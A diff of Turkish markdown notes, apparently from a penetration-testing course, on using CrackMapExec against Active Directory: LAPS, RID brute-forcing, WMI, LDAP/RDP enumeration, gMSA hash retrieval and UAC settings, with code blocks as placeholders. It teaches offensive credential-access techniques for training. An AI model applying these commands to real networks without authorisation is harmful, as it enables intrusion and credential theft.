+Local Administrator Password Solution (LAPS), domain'e bağlı bilgisayarların local hesap parolalarının yönetimini sağlar. Parolalar Active Directory'de (AD) saklanır ve ACL tarafından korunur, böylece yalnızca uygun kullanıcılar bunları okuyabilir veya sıfırlama talebinde bulunabilir. LAPS domain içinde kullanılıyorsa ve LAPS şifrelerini okuyabilen bir hesabı tehlikeye atarsak, `--laps` seçeneğini bir hedef listesi ile kullanabilir ve komutları çalıştırabilir veya `--sam` gibi diğer seçenekleri kullanabiliriz.
 
-![Pasted image 20241202203817.png](/img/user/resimler/Pasted%20image%2020241202203817.png)
 
-![Pasted image 20241202203835.png](/img/user/resimler/Pasted%20image%2020241202203835.png)
+{{CODE_BLOCK_129}}
 
-![Pasted image 20241202203857.png](/img/user/resimler/Pasted%20image%2020241202203857.png)
-
-Not: Varsayılan yönetici hesabı adı “administrator” değilse, kullanıcı adını --laps kullanıcı adı seçeneğinden sonra ekleyin.
-
+Not: Eğer varsayılan administrator hesap adı "`administrator`" değilse, -`-laps username` seçeneğinden sonra kullanıcı adını ekleyin.
 
 ### Hedefteki RID'yi Brute-forcing yaparak Kullanıcıları Numaralandır --rid-brute
 
-Nadiren kullanılan bir özellik, kullanıcı listeleri oluşturmak için RID Bruteforce'dur. BloodHound veya PowerView ile bir kullanıcı listesi oluşturabiliriz. Ancak, bu teknikler muhtemelen yakalanacak ve kurulumu biraz zaman alacaktır. CrackMapExec'in --rid-brute seçeneğini kullanarak, UserID'sini brute forcing yaparak bir kullanıcı listesi toplamak mümkündür.
+Nadiren kullanılan bir özellik, kullanıcı listeleri oluşturmak için `RID Bruteforce`'dur. `BloodHound` veya `PowerView` ile bir kullanıcı listesi oluşturabiliriz. Ancak, bu teknikler muhtemelen yakalanacak ve kurulumu biraz zaman alacaktır. CrackMapExec'in `--rid-brute` seçeneğini kullanarak, UserID'sini brute forcing yaparak bir kullanıcı listesi toplamak mümkündür.
 
 
 ### List Local Users
 
-![Pasted image 20241202204115.png](/img/user/resimler/Pasted%20image%2020241202204115.png)
-![Pasted image 20241202204130.png](/img/user/resimler/Pasted%20image%2020241202204130.png)
-![Pasted image 20241202204141.png](/img/user/resimler/Pasted%20image%2020241202204141.png)
-![Pasted image 20241202204153.png](/img/user/resimler/Pasted%20image%2020241202204153.png)
-![Pasted image 20241202204200.png](/img/user/resimler/Pasted%20image%2020241202204200.png)
+{{CODE_BLOCK_130}}
 
-Varsayılan olarak, --rid-brute 4000'e kadar RID'leri zorlayarak nesneleri numaralandırır. Davranışını --rid-brute [MAX_RID] kullanarak değiştirebiliriz.
+Varsayılan olarak, `--rid-brute 4000`'e kadar RID'leri zorlayarak objeleri numaralandırır. Davranışını `--rid-brute [MAX_RID]` kullanarak değiştirebiliriz.
 
-rid-brute seçeneği, brute ile zorlanan kimliklerle eşleşen kullanıcı adlarını ve diğer Active Directory nesnelerini almak için kullanılabilir. NULL Authentication etkinleştirilmişse domain hesaplarını numaralandırmak için de kullanılabilir. Bu seçeneğin bu şekillerde kullanılabileceğini unutmamak önemlidir.
-
+`--rid-brute` seçeneği, brute ile zorlanan kimliklerle eşleşen kullanıcı adlarını ve diğer Active Directory objeleri almak için kullanılabilir. `NULL Authentication` etkinleştirilmişse domain hesaplarını numaralandırmak için de kullanılabilir. Bu seçeneğin bu şekillerde kullanılabileceğini unutmamak önemlidir.
 
 ### Enumerate Disks
 
-Bazen kontrol etmeyi hatırlamamız gereken önemli bir parça, bir sunucuda bulunabilecek ek disklerdir. CrackMapExec, sunucuda var olan diskleri kontrol etmemizi sağlayan bir --disks seçeneğine sahiptir.
+Bazen kontrol etmeyi hatırlamamız gereken önemli bir parça, bir sunucuda bulunabilecek ek disklerdir. CrackMapExec, sunucuda var olan diskleri kontrol etmemizi sağlayan bir `--disks` seçeneğine sahiptir.
 
 ### Enumerating Disks
-![Pasted image 20241202204448.png](/img/user/resimler/Pasted%20image%2020241202204448.png)
+
+{{CODE_BLOCK_131}}
 
 
 ### Local ve Domain Gruplarını Numaralandırma
-Local-groups ile local grupları veya --groups ile domain gruplarını listeleyebiliriz.
+
+Local-groups ile local grupları veya `--groups` ile domain gruplarını listeleyebiliriz.
 
 ### Enumerating Local Groups
-![Pasted image 20241202204607.png](/img/user/resimler/Pasted%20image%2020241202204607.png)
-![Pasted image 20241202204629.png](/img/user/resimler/Pasted%20image%2020241202204629.png)
 
+{{CODE_BLOCK_132}}
 
 ### Enumerating Domain Groups
-![Pasted image 20241202204749.png](/img/user/resimler/Pasted%20image%2020241202204749.png)
-![Pasted image 20241202204830.png](/img/user/resimler/Pasted%20image%2020241202204830.png)
 
-Eğer grup üyelerini almak istiyorsak, --groups [GRUP ADI] kullanabiliriz.
+{{CODE_BLOCK_133}}
+
+
+Eğer grup üyelerini almak istiyorsak, `--groups [GRUP ADI]` kullanabiliriz.
 
 
 ### Group **Members**
-![Pasted image 20241202204931.png](/img/user/resimler/Pasted%20image%2020241202204931.png)
 
-Not: Yazım sırasında --local-group yalnızca bir Domain Controller'a karşı çalışır ve grup adını kullanarak bir grubu sorgulamak işe yaramaz.
+{{CODE_BLOCK_134}}
+
+Not: Yazım sırasında `--local-group` yalnızca bir Domain Controller'a karşı çalışır ve grup adını kullanarak bir grubu sorgulamak işe yaramaz.
 
 
-### Querying WMI
-[Windows Management Instrumentation](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page) (WMI), Windows işletim sistemlerinde yönetimsel işlemler için kullanılır. Remote bilgisayarlardaki yönetim görevlerini otomatikleştirmek için WMI komut dosyaları veya uygulamaları yazabiliriz. WMI, işletim sisteminin diğer bölümlerine ve System Center Operations Manager (eski adıyla Microsoft Operations Manager (MOM)) veya Windows Remote Management (WinRM) gibi ürünlere yönetim verileri sağlar.
+### WMI Sorgulama
 
-Windows Yönetim Araçları'nın (WMI) birincil kullanım alanlarından biri, sınıf ve örnek bilgileri için WMI havuzunu sorgulama yeteneğidir. Örneğin, WMI'dan remote veya local bir sistemden shut-down olaylarını temsil eden tüm nesneleri döndürmesini isteyebiliriz.
+[Windows Management Instrumentation](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page) (WMI), Windows işletim sistemlerinde administrative işlemler için kullanılır. Remote bilgisayarlardaki administrative görevlerini otomatikleştirmek için WMI script dosyaları veya uygulamaları yazabiliriz. WMI, işletim sisteminin diğer bölümlerine ve System Center Operations Manager (eski adıyla Microsoft Operations Manager (MOM)) veya Windows Remote Management (WinRM) gibi ürünlere yönetim verileri sağlar.
 
-WMI, TCP port 135 ve bir dizi dinamik port kullanır: 49152-65535 (RPC dinamik portları - Windows Vista, 2008 ve üzeri), TCP 1024-65535 (RPC dinamik portları - Windows NT4, Windows 2000, Windows 2003) veya WMI'yı özel bir port aralığı kullanacak şekilde ayarlayabiliriz
+Windows Management Instrumentation'nın (WMI) birincil kullanım alanlarından biri, sınıf (class) ve örnek (instance) bilgileri için WMI havuzunu sorgulama yeteneğidir. Örneğin, WMI'dan remote veya local bir sistemden shut-down olaylarını temsil eden tüm objeleri döndürmesini isteyebiliriz.
 
-Örneğin, remote bir bilgisayarda Sysmon uygulamasının çalışıp çalışmadığını sorgulamak ve Caption ve ProcessId'yi görüntülemek için WMI kullanalım, kullanacağımız WMI sorgusu SELECT Caption,ProcessId FROM Win32_Process WHERE Caption LIKE '%sysmon%' şeklindedir:
+WMI, TCP port `135` ve bir dizi dinamik port kullanır: `49152-65535 (RPC dinamik portları - Windows Vista, 2008 ve üzeri)`, TCP 1024-65535 (RPC dinamik portları - Windows NT4, Windows 2000, Windows 2003) veya WMI'yı özel bir port aralığı kullanacak şekilde ayarlayabiliriz
+
+Örneğin, remote bir bilgisayarda `Sysmon` uygulamasının çalışıp çalışmadığını sorgulamak ve `Caption` ve `ProcessId`'yi görüntülemek için WMI kullanalım, kullanacağımız WMI sorgusu S`ELECT Caption,ProcessId FROM Win32_Process WHERE Caption LIKE '%sysmon%'` şeklindedir:
 
 
 ### Sysmon'un Çalışıp Çalışmadığını Sorgulamak için WMI Kullanma
-![Pasted image 20241202210123.png](/img/user/resimler/Pasted%20image%2020241202210123.png)
 
-WMI, sınıflarını hiyerarşik bir ad alanında düzenler. Bir sorgu gerçekleştirmek için, Class Name (Sınıf Adı) ve içinde bulunduğu Namespace'i (Ad Alanı) bilmemiz gerekir. Yukarıdaki örnekte, root\cimv2 namespace'indeki Win32_Process sınıfını sorgulayın. Namespace belirtmedik çünkü varsayılan olarak CME root\cimv2 kullanır (bu bilgiyi --help menüsünde görebiliriz)
+{{CODE_BLOCK_135}}
 
-Başka bir namespace'i sorgulamak için onu belirtmemiz gerekir. Örneğin, root\WMI namespace'inde bulunan MSPower_DeviceEnable sınıfını sorgulayalım. Bu sınıf, sistem çalışırken dinamik olarak açılıp kapanması gereken cihazlar hakkında bilgi tutar. Belirli bir konuyla ilgili WMI sınıflarının nasıl bulunacağı hakkında daha fazla bilgi edinmek için [Microsoft](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_wmi?view=powershell-5.1#finding-wmi-classes) ve [wutils.com'](https://wutils.com/wmi/)daki 3. taraf belgelerini kullanabiliriz.
+WMI, sınıflarını hiyerarşik bir namespace içinde düzenler. Bir sorgu gerçekleştirmek için, Class Name ve bulunduğu Namespace'i bilmemiz gerekir. Yukarıdaki örnekte, `Win32_Process` sınıfını `root\cimv2` namespace'inde sorguluyoruz. Namespace'i belirtmedik çünkü varsayılan olarak CME, `root\cimv2`'yi kullanır (bu bilgiyi --help menüsünde görebiliriz).
+
+Başka bir namespace'i sorgulamak için onu belirtmemiz gerekir. Örneğin, `root\WMI` namespace'inde bulunan `MSPower_DeviceEnable` sınıfını sorgulayalım. Bu sınıf, sistem çalışırken dinamik olarak açılıp kapanması gereken cihazlar hakkında bilgi tutar. Belirli bir konuyla ilgili WMI sınıflarının nasıl bulunacağı hakkında daha fazla bilgi edinmek için [Microsoft](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_wmi?view=powershell-5.1#finding-wmi-classes) ve [wutils.com'](https://wutils.com/wmi/)daki 3. taraf belgelerini kullanabiliriz.
 
 
 ### Quering root\WMI Namespace
-![Pasted image 20241202212300.png](/img/user/resimler/Pasted%20image%2020241202212300.png)
-![Pasted image 20241202212343.png](/img/user/resimler/Pasted%20image%2020241202212343.png)
 
-Not: Genellikle, WMI'yı sorgulamak için yönetici ayrıcalıklarına sahip olmamız gerekir, ancak bir yönetici, WMI'yı sorgulamak için yönetici olmayan bir hesabı yapılandırabilir. Bu durumda, WMI sorgularını gerçekleştirmek için yönetici olmayan bir hesap kullanabiliriz.
+{{CODE_BLOCK_136}}
 
-WMI Sorgu Dili (WQL) hakkında daha fazla bilgi edinmek için Microsoft'un Belgelerini okuyabiliriz.
+Not: Genellikle, WMI'yı sorgulamak için administrative ayrıcalıklarına sahip olmamız gerekir, ancak bir administrator, WMI'yı sorgulamak için administrator olmayan bir hesabı yapılandırabilir. Bu durumda, WMI sorgularını gerçekleştirmek için administrator olmayan bir hesap kullanabiliriz.
+
+WMI Sorgu Dili (WQL) hakkında daha fazla bilgi edinmek için [Microsoft'un Belgelerini](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wql-sql-for-wmi) okuyabiliriz.
+
+
 
 Aşağıdaki bölüm LDAP ve RDP protokollerini kullanarak numaralandırmayı kapsayacaktır.
 
+----
+
 
 ### LDAP and RDP Enumeration
-Daha önce, CrackMapExec'te en çok kullanılan protokol olan SMB ile bazı numaralandırma seçeneklerini inceledik, ancak LDAP ve RDP protokolleri ile daha fazla numaralandırma seçeneği vardır
+
+Daha önce, CrackMapExec'te en çok kullanılan protokol olan `SMB` ile bazı numaralandırma seçeneklerini inceledik, ancak `LDAP` ve `RDP` protokolleri ile daha fazla numaralandırma seçeneği vardır
 
 Bu bölümde, bu seçeneklerden bazıları ve hedeflerimizi nasıl daha fazla numaralandırabileceğimiz gösterilecektir
 
-
 ### LDAP & RDP Commands
+
 LDAP ve RDP protokolleri aşağıdaki seçenekleri içerir:
-![Pasted image 20241202225531.png](/img/user/resimler/Pasted%20image%2020241202225531.png)
-![Pasted image 20241202225542.png](/img/user/resimler/Pasted%20image%2020241202225542.png)
 
-Henüz çalışmadıklarımızı gözden geçirelim.
+| Komut                                                                          | Açıklama                                                                                           |
+| ------------------------------------------------------------------------------ | -------------------------------------------------------------------------------------------------- |
+| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --users`                  | Etkin Domain kullanıcılarını listeler.                                                             |
+| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --groups`                 | Domain gruplarını listeler.                                                                        |
+| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --password-notrequired`   | `PASSWORD_NOTREQD` bayrağı olan kullanıcıları listeler.                                            |
+| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --trusted-for-delegation` | `TRUSTED_FOR_DELEGATION` bayrağı olan kullanıcı ve bilgisyalarını listeler.                        |
+| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --admin-count`            | `adminCount=1` derecesine sahip objeleri listeler.                                                 |
+| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --get-sid`                | Domainin SID bilgisini alır.                                                                       |
+| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --gmsa`                   | GMSA (Gruplandırılmış Yönetici Hizmet Hesapları) şifrelerini listeler.                             |
+| `crackmapexec rdp <hedef> -u <kullanıcı> -p <şifre> --nla-screenshot`          | NLA (Ağ Seviyesinde Kimlik Doğrulaması) devre dışı ise RDP giriş ekranının ekran görüntüsünü alır. |
+| `crackmapexec rdp <hedef> -u <kullanıcı> -p <şifre> --screenshot`              | Bağlantı başarılıysa RDP oturumunun ekran görüntüsünü alır.                                        |
+| `crackmapexec rdp <hedef> -u <kullanıcı> -p <şifre> --screentime`              | Masaüstü görüntüsü için bekleme süresini belirtir.                                                 |
+| `crackmapexec rdp <hedef> -u <kullanıcı> -p <şifre> --res RES`                 | Çözünürlük belirler (örnek format: WIDTHxHEIGHT, varsayılan: 1024x768).                            |
 
+Henüz çalışmadıklarımız varsa onları gözden geçirelim.
 
 ### Enumerating Users and Groups
 
-SMB protokolünde yaptığımız gibi, LDAP ile de kullanıcıları ve grupları listeleyebiliriz:
+SMB protokolünde yaptığımız gibi, `LDAP` ile de kullanıcıları ve grupları listeleyebiliriz:
 
 ### Enumerating Users and Groups
 
-![Pasted image 20241202225710.png](/img/user/resimler/Pasted%20image%2020241202225710.png)
-![Pasted image 20241202225721.png](/img/user/resimler/Pasted%20image%2020241202225721.png)
-![Pasted image 20241202225733.png](/img/user/resimler/Pasted%20image%2020241202225733.png)
-![Pasted image 20241202225743.png](/img/user/resimler/Pasted%20image%2020241202225743.png)
+{{CODE_BLOCK_137}}
 
-Not: Domain FQDN'sini çözümleyemezsek LDAP protokol iletişimlerinin çalışmayacağını unutmayın. Domain DNS sunucularına bağlanmıyorsak, FQDN'yi /etc/hosts dosyasında yapılandırmamız gerekir
+Not: Domain FQDN'sini çözümleyemezsek LDAP protokol iletişimlerinin çalışmayacağını unutmayın. Domain DNS sunucularına bağlanmıyorsak, FQDN'yi `/etc/hosts` dosyasında yapılandırmamız gerekir
 
 
 ### İlginç Hesap Özelliklerini Numaralandırma
 
-ldap protokolü, PASSWD_NOTREQD veya TRUSTED_FOR_DELEGATION bayrağı ile hesapları tanımlamamıza yardımcı olacak birkaç seçeneğe daha sahiptir ve hatta adminCount değeri 1 olan tüm hesapları sorgulayabiliriz.
+`ldap` protokolü, `PASSWD_NOTREQD` veya `TRUSTED_FOR_DELEGATION` bayrağı ile hesapları tanımlamamıza yardımcı olacak birkaç seçeneğe daha sahiptir ve hatta `adminCount` değeri `1` olan tüm hesapları sorgulayabiliriz.
 
-PASSWD_NOTREQD hesap denetimi özniteliği ayarlanmışsa, kullanıcı geçerli parola ilkesi uzunluğuna tabi değildir, yani daha kısa bir parolaya sahip olabilir veya hiç parola kullanmayabilir ( domain'de boş parolalara izin veriliyorsa). Bu hesapları tanımlamak için --password-notrequired seçeneğini kullanabiliriz.
-
-
-### PASSWD_NOTREQD Özniteliğinin Tanımlanması
-
-![Pasted image 20241202230116.png](/img/user/resimler/Pasted%20image%2020241202230116.png)
-![Pasted image 20241202230124.png](/img/user/resimler/Pasted%20image%2020241202230124.png)
-
-TRUSTED_FOR_DELEGATION özniteliği ayarlanırsa, bir hizmetin altında çalıştığı hizmet hesabı (kullanıcı veya bilgisayar) Kerberos yetkilendirmesi için güvenilirdir, yani hizmeti talep eden bir istemciyi taklit edebilir. Bu saldırı türüne Kerberos Unconstrained Delegation adı verilir. Bu konu hakkında daha fazla bilgi edinmek için bu [blog](https://adsecurity.org/?p=1667) yazısını okuyabilirsiniz.
-
-### Kısıtlamasız Delegasyonun Belirlenmesi
-![Pasted image 20241202230729.png](/img/user/resimler/Pasted%20image%2020241202230729.png)
-
-adminCount özniteliği, SDProp işleminin bir kullanıcıyı koruyup korumadığını belirler. Bu işlemde, Active Directory'deki AdminSDHolder, korunan kullanıcı hesaplarının ACL izinleri için bir şablon görevi görür. Herhangi bir ACE hesabı değiştirilirse (örneğin, bir saldırgan tarafından), bu işlem tarafından korunan hesapların ACL izinleri, SDProp işlemi her çalıştığında şablon izin kümesine sıfırlanır; bu varsayılan olarak her 60 dakikada bir yapılır ancak değiştirilebilir. Değer 0 olarak ayarlanmışsa veya belirtilmemişse kullanıcı kapsam dışıdır. Öznitelik değeri 1 olarak ayarlanırsa kullanıcı korunur. Saldırganlar genellikle dahili bir ortamda hedef almak için adminCount özniteliği 1 olarak ayarlanmış hesapları ararlar. Bunlar genellikle ayrıcalıklı hesaplardır ve daha fazla erişime veya domain'in tamamen ele geçirilmesine yol açabilir.
+`PASSWD_NOTREQD` hesap denetimi attribute ayarlanmışsa, kullanıcı geçerli password policy uzunluğuna tabi değildir, yani daha kısa bir parolaya sahip olabilir veya hiç parola kullanmayabilir (domain'de boş parolalara izin veriliyorsa). Bu hesapları tanımlamak için  `--password-notrequired` seçeneğini kullanabiliriz.
 
 
-### adminCount Özniteliğini Sorgulama
-![Pasted image 20241202230901.png](/img/user/resimler/Pasted%20image%2020241202230901.png)
-![Pasted image 20241202230911.png](/img/user/resimler/Pasted%20image%2020241202230911.png)
-![Pasted image 20241202230921.png](/img/user/resimler/Pasted%20image%2020241202230921.png)
+### PASSWD_NOTREQD Attribute Tanımlanması
+
+{{CODE_BLOCK_138}}
+
+`TRUSTED_FOR_DELEGATION` attribute ayarlanırsa, bir servisin altında çalıştığı servis hesabı (kullanıcı veya bilgisayar) Kerberos yetkilendirmesi için güvenilirdir, yani servisi talep eden bir client'i taklit edebilir. Bu saldırı türüne `Kerberos Unconstrained Delegation` adı verilir. Bu konu hakkında daha fazla bilgi edinmek için bu [blog](https://adsecurity.org/?p=1667) yazısını okuyabilirsiniz.
+
+### Unconstrained Delegation Belirlenmesi
+
+{{CODE_BLOCK_139}}
+
+`AdminCount` attribute, SDProp process'in bir kullanıcıyı koruyup korumadığını belirler. Bu process'te, Active Directory'deki `AdminSDHolder`, korunan user account'lar için ACL permissions'ın bir template'i olarak görev yapar. Eğer herhangi bir account ACE'si (örneğin, bir attacker tarafından) modified edilirse, bu process tarafından korunan account'ların ACL permissions'ı, `SDProp` process her çalıştığında (default olarak her 60 dakikada bir çalışır, ancak bu süre modified edilebilir) templated permission set'e resetlenir. User, adminCount değeri 0 olarak set edilmişse veya specified değilse bu koruma kapsamına girmez. Eğer attribute value 1 olarak set edilmişse, user korunur. Attacker'lar genellikle internal environment'ta adminCount attribute'i 1 olan account'ları target olarak arar. Bunlar genellikle privileged account'lardır ve further access veya full domain compromise ile sonuçlanabilir.
+
+
+### adminCount Attribute'u Sorgulama
+
+{{CODE_BLOCK_140}}
 
 
 ### Domain SID'sini numaralandırma
 
-Bazı domain saldırıları, kullanıcı veya domain SID'si gibi belirli domain bilgilerini edinmemizi gerektirir. SID (Security IDentifier), bir bilgisayarın veya domain controller'ın sizi tanımlamak için kullandığı benzersiz bir kimlik numarasıdır. Domain sid, domain'i tanımlayan benzersiz bir kimlik numarasıdır. CrackMapExec kullanarak domain sid'sini almak için --get-sid bayrağını kullanabiliriz:
+Bazı domain attack'ları, bir user veya domain SID gibi belirli domain bilgilerini elde etmemizi gerektirir. SID (Security IDentifier), bir computer veya domain controller'ın sizi tanımlamak için kullandığı `unique bir ID` numarasıdır. Domain SID ise domain'i tanımlayan unique bir ID numarasıdır. CrackMapExec kullanarak domain SID'i elde etmek için `--get-sid` flag'ini kullanabiliriz:
 
+### Domain SID'i Toplama
 
-### Gathering the Domain SID
-
-![Pasted image 20241202231106.png](/img/user/resimler/Pasted%20image%2020241202231106.png)
-![Pasted image 20241202231112.png](/img/user/resimler/Pasted%20image%2020241202231112.png)
+{{CODE_BLOCK_141}}
 
 
 ### Group Managed Service Accounts (gMSA)
@@ -5303,138 +6044,158 @@ Bağımsız Yönetilen Hizmet Hesabı (standalone Managed Service Account) (sMSA
 * Basitleştirilmiş service principal name (SPN) yönetimi.
 * Yönetimi diğer yöneticilere devretme yeteneği
 
-Bu yönetilen hizmet hesabı (MSA) türü Windows Server 2008 R2 ve Windows 7'de tanıtılmıştır.
+Bu yönetilen servis hesabı (MSA) türü Windows Server 2008 R2 ve Windows 7'de tanıtılmıştır.
 
 Group Managed Service Account (gMSA) domain içinde aynı işlevselliği sağlar ancak aynı zamanda bu işlevselliği birden fazla sunucuya genişletir.
 
 Bir gMSA hesabının parolasını okuma ayrıcalıklarına sahip bir hesabı belirlemek için PowerShell'i kullanabiliriz (komut yürütmeyi bir sonraki bölümde daha ayrıntılı olarak ele alacağız):
 
-
 ### Enumerating Accounts with gMSA Privileges
-![Pasted image 20241202231402.png](/img/user/resimler/Pasted%20image%2020241202231402.png)
-![Pasted image 20241202231409.png](/img/user/resimler/Pasted%20image%2020241202231409.png)
 
-Yukarıdaki örnekte, engels kullanıcısının PrincipalsAllowedToRetrieveManagedPassword ayrıcalığına sahip olduğunu görebiliriz, bu da svc_inlaneadm$ gMSA hesabının parolasını okuyabileceği anlamına gelir. gMSA parolasını okuma hakkına sahip bir hesabı tehlikeye atarsak, hesabın NTLM parola hash'ini almak için --gmsa seçeneğini kullanabiliriz.
+{{CODE_BLOCK_142}}
+
+
+Yukarıdaki örnekte, `engels` kullanıcısının `PrincipalsAllowedToRetrieveManagedPassword` ayrıcalığına sahip olduğunu görebiliriz, bu da `svc_inlaneadm$` gMSA hesabının parolasını okuyabileceği anlamına gelir. gMSA parolasını okuma hakkına sahip bir hesabı tehlikeye atarsak, hesabın `NTLM` parola hash'ini almak için `--gmsa` seçeneğini kullanabiliriz.
 
 
 ### gMSA Parolasını Edinme
-![Pasted image 20241202231528.png](/img/user/resimler/Pasted%20image%2020241202231528.png)
+
+{{CODE_BLOCK_143}}
 
 Bu kimlik bilgilerini kullanmak için, hash'ler için -H seçeneğini kullanabiliriz.
 
-
 ### svc_inlaneadm$ Hesabı ile Paylaşılan Klasörleri İnceleme
-![Pasted image 20241202231553.png](/img/user/resimler/Pasted%20image%2020241202231553.png)
-![Pasted image 20241202231601.png](/img/user/resimler/Pasted%20image%2020241202231601.png)
 
+{{CODE_BLOCK_144}}
+
+
+---
 
 ### RDP Screenshots
-RDP protokolü aracılığıyla kullanıcı adlarını numaralandırmak için CrackMapExec'i kullanabiliriz. Hedef makinede RDP'ye yalnızca NLA ile izin verme seçeneği devre dışı bırakılmışsa, oturum açma isteminin ekran görüntüsünü almak için --nlascreenshot seçeneğini kullanabiliriz
+
+RDP protokolü aracılığıyla kullanıcı adlarını numaralandırmak için CrackMapExec'i kullanabiliriz. Hedef makinede RDP'ye yalnızca `NLA` ile izin verme seçeneği devre dışı bırakılmışsa, oturum açma isteminin ekran görüntüsünü almak için `--nlascreenshot` seçeneğini kullanabiliriz
 
 
 ### Enumerate Login Prompt
-![Pasted image 20241202231656.png](/img/user/resimler/Pasted%20image%2020241202231656.png)
+
+{{CODE_BLOCK_145}}
 
 Ekran görüntüsünü açmak için MATE'in Eye'ını veya CLI'dan eom'u kullanabiliriz.
 
 
-### Ekran Görüntüsünü Açmak için MATE'in Gözünü Kullanma
-![Pasted image 20241202231729.png](/img/user/resimler/Pasted%20image%2020241202231729.png)
+### Ekran Görüntüsünü Açmak için MATE'in Eye Kullanma
+
+{{CODE_BLOCK_146}}
+
 ![Pasted image 20241202231735.png](/img/user/resimler/Pasted%20image%2020241202231735.png)
 
-Eğer bir kullanıcı adı ve parolamız varsa, --screenshot seçeneği ile RDP protokolünü kullanarak da ekran görüntüsü alabiliriz. Bu seçenek --screentime ile birleştirilebilir, varsayılan olarak 10, RDP bağlantısı açıldıktan sonra ekran görüntüsü almak için bekleyeceği süredir. Bu, bir hedef makineye bağlandığımızda ve hedefin masaüstünü yüklemesi 10 saniyeden fazla sürdüğünde kullanışlıdır.
+Eğer bir kullanıcı adı ve parolamız varsa, `--screenshot` seçeneği ile RDP protokolünü kullanarak da ekran görüntüsü alabiliriz. Bu seçenek `--screentime` ile birleştirilebilir, varsayılan olarak `10`, RDP bağlantısı açıldıktan sonra ekran görüntüsü almak için bekleyeceği süredir. Bu, bir hedef makineye bağlandığımızda ve hedefin masaüstünü yüklemesi 10 saniyeden fazla sürdüğünde kullanışlıdır.
 
-Ekran görüntüsü seçeneğiyle birleştirilebilecek bir diğer seçenek de RDP bağlantısı sırasındaki ekran çözünürlüğüne karşılık gelen --res seçeneğidir. Bu seçenek yararlıdır çünkü aktif bir RDP oturumu bulursak, kullanıcının ekranının boyutuna bağlı olarak tüm içeriği görebiliriz veya göremeyiz. Varsayılan olarak bu seçenek 1024x768 olarak ayarlanmıştır
-
-
-
-### Taking a Screenshot
-![Pasted image 20241202232439.png](/img/user/resimler/Pasted%20image%2020241202232439.png)
-![Pasted image 20241202232444.png](/img/user/resimler/Pasted%20image%2020241202232444.png)
+Ekran görüntüsü seçeneğiyle birleştirilebilecek bir diğer seçenek de RDP bağlantısı sırasındaki ekran çözünürlüğüne karşılık gelen `--res` seçeneğidir. Bu seçenek yararlıdır çünkü aktif bir RDP oturumu bulursak, kullanıcının ekranının boyutuna bağlı olarak tüm içeriği görebiliriz veya göremeyiz. Varsayılan olarak bu seçenek `1024x768` olarak ayarlanmıştır
 
 
-Not: --screentime ve --res isteğe bağlı bayraklardır.
+### Screenshot Alma
+
+{{CODE_BLOCK_147}}
+
+
+Not: `--screentime` ve `--res` isteğe bağlı bayraklardır.
 
 Son olarak, ekran görüntüsünü açmak için MATE'in Eye'ını veya CLI'dan eom'u kullanabiliriz:
 
 
 ### Ekran Görüntüsünü Açmak için MATE'in Gözünü Kullanma
-![Pasted image 20241202232517.png](/img/user/resimler/Pasted%20image%2020241202232517.png)
+
+{{CODE_BLOCK_148}}
+
 ![Pasted image 20241202232523.png](/img/user/resimler/Pasted%20image%2020241202232523.png)
 
-
-Bu bölümde, hedeflerimizi arşivlemeye yardımcı olabilecek LDAP ve RDP kullanarak çeşitli numaralandırma seçeneklerini araştırdık. Bir sonraki bölümde CrackMapExec kullanarak komutların nasıl çalıştırılacağı incelenecektir.
-
+Bu bölümde, hedeflerimize ulaşmamıza yardımcı olabilecek LDAP ve RDP kullanarak çeşitli numaralandırma seçeneklerini inceledik. Aşağıdaki bölüm, CrackMapExec kullanarak komutların nasıl çalıştırılacağını gözden geçirecektir.
 
 
-
+---
 
 ### Command Execution
 
-Remote target üzerinde local administrator olarak bir komut çalıştırmaya çalışmadan önce UAC'nin varlığını kontrol etmeliyiz. UAC etkinleştirildiğinde, ki bu varsayılan durumdur, yalnızca RID 500'e sahip yönetici hesabı (varsayılan yönetici) remote komutları yürütebilir. Durumun böyle olup olmadığını kontrol etmek için iki registry key vardır:
+Remote target üzerinde local administrator olarak bir komut çalıştırmaya çalışmadan önce `UAC`'nin varlığını kontrol etmeliyiz. UAC etkinleştirildiğinde, ki bu varsayılan durumdur, yalnızca `RID 500`'e sahip administrator hesabı (varsayılan administrator) remote komutları yürütebilir. Durumun böyle olup olmadığını kontrol etmek için iki registry key vardır:
 
-![Pasted image 20241203095807.png](/img/user/resimler/Pasted%20image%2020241203095807.png)
+`HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy`
+`HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`
 
-Varsayılan olarak, LocalAccountTokenFilterPolicy değeri 0 olarak ayarlanmıştır, yani yalnızca built-in administrator hesabı (RID 500) yönetim görevlerini gerçekleştirebilir. Local administrator grubunda olsak bile, yalnızca kullanıcımızın RID'si 500 ise remote komutları çalıştırabiliriz. Değer 1 olarak ayarlanırsa tüm yönetici hesapları yönetim görevlerini yürütebilir.
+Varsayılan olarak, `LocalAccountTokenFilterPolicy` değeri 0 olarak ayarlanmıştır, yani yalnızca built-in administrator hesabı (RID 500) administration görevlerini gerçekleştirebilir. Local administrator grubunda olsak bile, yalnızca kullanıcımızın RID'si `500` ise remote komutları çalıştırabiliriz. Değer 1 olarak ayarlanırsa tüm administrative hesapları yönetim görevlerini yürütebilir.
 
-Yöneticinin yapılandırabileceği bir diğer ayar da local administrator hesabının (RID 500) uzaktan yönetim görevlerini yerine getirmesini engellemektir. Bu, FilterAdministratorToken kayıt defteri değerini 1 olarak ayarlayarak yapılabilir; bu, built-in administrator hesabının (RID 500) remote administrative tasks (uzaktan yönetim görevleri) gerçekleştiremeyeceği anlamına gelir.
